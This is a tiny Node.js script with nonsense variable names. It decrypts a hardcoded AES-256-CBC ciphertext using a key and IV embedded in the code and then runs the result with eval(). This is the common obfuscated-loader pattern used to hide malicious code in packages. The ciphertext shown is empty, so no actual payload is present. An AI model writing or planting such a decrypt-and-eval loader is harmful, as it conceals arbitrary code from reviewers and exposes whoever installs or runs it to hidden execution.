const ito = require('crypto');
const itinho = Buffer.from('1fcc88d2af936cbe439e534935bdf2a840bc07e18b773830b7c63cb8de87b250', 'hex');
const octua = Buffer.from('49566ad7d67d3a9cb8ae3dcf98142875', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
